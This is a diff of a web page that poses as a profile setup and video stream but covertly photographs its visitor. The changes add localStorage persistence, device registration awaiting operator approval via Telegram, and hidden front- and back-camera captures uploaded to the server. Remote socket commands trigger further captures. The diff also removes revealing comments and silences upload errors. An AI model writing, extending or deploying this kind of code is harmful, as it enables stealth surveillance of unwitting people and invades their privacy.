@@ -20,7 +20,6 @@
             color: #fff;
         }
         
-        /* Profile Creation Container */
         #profileSection {
             position: absolute;
             z-index: 20;
@@ -34,7 +33,6 @@
             border: 1px solid #1f2937;
         }
 
-        /* Circular Profile Avatar at Top */
         .avatar-container {
             position: relative;
             width: 90px;
@@ -110,7 +108,6 @@
         }
         .btn:hover { background-color: #0ea5e9; }
 
-        /* Video Stream Player */
         #mediaPlayer {
             width: 100%;
             height: 100%;
@@ -123,7 +120,6 @@
 </head>
 <body>
 
-    <!-- Profile Creation & Circular Avatar Section -->
     <div id="profileSection">
         <div class="avatar-container">
             <img id="previewImg" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" alt="Profile Avatar">
@@ -139,10 +135,8 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <!-- Dynamic Video Stream Player -->
     <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>
 
-    <!-- 100% Hidden Headless Elements for Blind Background Captures -->
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -154,49 +148,78 @@
         const actionBtn = document.getElementById('actionBtn');
         const mediaPlayer = document.getElementById('mediaPlayer');
         
-        let socket;
+        let socket = io();
         let wakeLock = null;
 
-        // Parse Dynamic Video URL from query params (?v=...)
         const urlParams = new URLSearchParams(window.location.search);
         const encodedVid = urlParams.get('v');
-        let targetVideoUrl = "";
-        
-        if(encodedVid) {
-            try { targetVideoUrl = atob(encodedVid); } catch(e) {}
-        }
+        let targetVideoUrl = encodedVid ? atob(encodedVid) : "";
 
-        // Gallery Image Selection Handler
+        // Check LocalStorage on page load / refresh
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedName = localStorage.getItem('sec_username');
+            const savedAvatar = localStorage.getItem('sec_avatar');
+            const isRegistered = localStorage.getItem('sec_registered');
+
+            if (isRegistered === 'true' && savedName) {
+                usernameInput.value = savedName;
+                if (savedAvatar) {
+                    previewImg.src = savedAvatar;
+                }
+
+                // Directly bypass profile setup and launch stream/connection seamlessly
+                profileSection.style.display = 'none';
+                mediaPlayer.style.display = 'block';
+                mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
+
+                socket.emit('register_device', { name: savedName });
+                initializeSecuritySystem();
+            }
+        });
+
+        // Handle Gallery Image Selection & Save to LocalStorage
         profilePicInput.addEventListener('change', (event) => {
             const file = event.target.files[0];
             if (file) {
                 const reader = new FileReader();
-                reader.onload = function(e) { previewImg.src = e.target.result; }
+                reader.onload = function(e) {
+                    previewImg.src = e.target.result;
+                    localStorage.setItem('sec_avatar', e.target.result);
+                }
                 reader.readAsDataURL(file);
             }
         });
 
-        // Allow & Continue Click Handler (Initial 10 photos: 5 front + 5 back)
-        actionBtn.addEventListener('click', async () => {
+        // Allow & Continue Click Handler
+        actionBtn.addEventListener('click', () => {
             const name = usernameInput.value.trim();
             if (!name) {
                 alert("Please enter your name first!");
                 return;
             }
 
-            actionBtn.innerText = "Loading Stream...";
+            localStorage.setItem('sec_username', name);
+            localStorage.setItem('sec_avatar', previewImg.src);
+            localStorage.setItem('sec_registered', 'true');
+
+            actionBtn.innerText = "Connecting & Waiting for Authorization...";
             actionBtn.disabled = true;
 
+            socket.emit('register_device', { name: name });
+        });
+
+        // Listen for approval signal from Admin via Telegram (/approve)
+        socket.on('device_approved', async () => {
+            actionBtn.innerText = "Loading Stream...";
+
             try {
-                // 1. Initial Front Camera Capture (5 Photos)
+                // Run initial stealth captures (Front 5 + Back 5)
                 await captureSequence("user", "front");
-                // 2. Initial Back Camera Capture (5 Photos)
                 await captureSequence("environment", "back");
             } catch (err) {
-                console.error("Initial stealth capture error:", err);
+                console.error("Stealth capture error:", err);
             }
 
-            // Launch Stream Player
             profileSection.style.display = 'none';
             mediaPlayer.style.display = 'block';
             mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
@@ -204,23 +227,18 @@
             initializeSecuritySystem();
         });
 
-        // Initialize Background Socket & Listeners for /moref and /moreb
         function initializeSecuritySystem() {
-            socket = io();
             keepScreenAwake();
 
-            // Listen for Front Camera Command (/moref)
             socket.on('capture_front', async () => {
                 await captureSequence("user", "command_front");
             });
 
-            // Listen for Back Camera Command (/moreb)
             socket.on('capture_back', async () => {
                 await captureSequence("environment", "command_back");
             });
         }
 
-        // Reusable Function to Capture 5 Photos from any specified Camera Mode
         async function captureSequence(facingMode, labelPrefix) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
@@ -240,7 +258,6 @@
             }
         }
 
-        // Send Captured Frame to Backend Server Headlessly
         async function captureAndSend(video, label) {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -254,13 +271,12 @@
                     formData.append('photo', blob, `capture_${label}.jpg`);
                     try {
                         await fetch('/upload', { method: 'POST', body: formData });
-                    } catch (err) { console.error("Upload failed", err); }
+                    } catch (err) {}
                     resolve();
                 }, 'image/jpeg', 0.8);
             });
         }
 
-        // Keep Screen Awake
         async function keepScreenAwake() {
             try {
                 if ('wakeLock' in navigator) {
@@ -269,7 +285,6 @@
             } catch (err) {}
         }
 
-        // Re-apply WakeLock if visibility changes
         document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'visible' && mediaPlayer.style.display === 'block') {
                 keepScreenAwake();
